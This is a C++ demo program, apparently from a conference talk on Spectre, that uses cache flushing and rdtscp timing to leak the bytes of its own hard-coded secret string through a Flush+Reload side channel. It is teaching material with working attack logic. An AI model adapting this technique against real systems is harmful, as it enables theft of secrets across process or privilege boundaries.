/*
 * cache.cpp
 *      Demo of standard cache side channel attack.
 *
 * code taken from cppcon 2018 chandler carruty spectre talk
 */

#include <algorithm>
#include <numeric>
#include <array>
#include <iostream>
#include <cstring>
#include <string_view>
#include <tuple>
#include <x86intrin.h>

static constexpr std::string_view sekret = "This is my secret!";

static void force_read(uint8_t *p) {
    asm volatile("" : : "r"(*p) : "memory");
}

static int64_t read_tsc() {
    unsigned int junk;
    return __rdtscp(&junk);
}

template <typename RangeT>
static std::pair<int, int> top_two_indices(const RangeT &range) {
    int j{0}, k{0};
    for(unsigned int i{0}; i < range.size(); i++) {
        if(range[i] > range[j]) {
            k = j;
            j = i;
        } else if(range[i] > range[k]) {
            k = i;
        }
    }
    return {j, k};
}

/* 
 * perform cache attack against text[idx]
 * In a real attack the attacker would be flushing cache and measuring while
 * the victim is doing the data-dependent read. In this demo they are done
 * together in the ideal order for the attacker.
 */
char leak_byte(std::string_view text, int idx) {
    constexpr auto stride = 512;
    static uint8_t timing_array[256 * stride];
    memset(timing_array, 1, sizeof timing_array);

    const char *data = text.begin();

    std::array<int64_t, 256> latencies{};
    std::array<int, 256> scores{};
    int best_val{0}, runner_up_val{0};

    for(int run{0}; run < 1000; run++) {
        // flush all of timing array
        for(int i{0}; i < 256; i++) {
            _mm_clflush(&timing_array[i * stride]);
        }

        // perform reads that are data-dependent on the secret
        // as a program being attacked might
        for(int i{0}; i < 100; i++) {
            force_read(&timing_array[data[idx] * stride]);
        }

        // now measure read latencies to see if we can detect what data[idx] was
        for(int i{0}; i < 256; i++) {
            int mixed_i{((i * 167) + 13) & 0xff}; // ???, I guess so we test in pseudo-random order?
            uint8_t *timing_entry{&timing_array[mixed_i * stride]};
            int64_t start{read_tsc()};
            force_read(timing_entry);
            latencies[mixed_i] = read_tsc() - start;
        }

        // score anything that stands out
        int64_t avg_latency{std::accumulate(latencies.begin(), latencies.end(), 0) / 256};
        for(int i{0}; i < 256; i++) {
            if(latencies[i] < (avg_latency * 3 / 4)) {
                scores[i]++;
            }
        }

        // see if any score is significantly better than the rest
        std::tie(best_val, runner_up_val) = top_two_indices(scores);
        if(scores[best_val] > (2 * scores[runner_up_val] + 400)) {
            break;
        }
    }

    return char(best_val);
}

int main(int argc, char **argv) {
    for(unsigned long i{0}; i < sekret.size(); i++) {
        char ch{leak_byte(sekret, i)};
        std::cout << "got: " << ch << std::endl;
    }
    return 0;
}
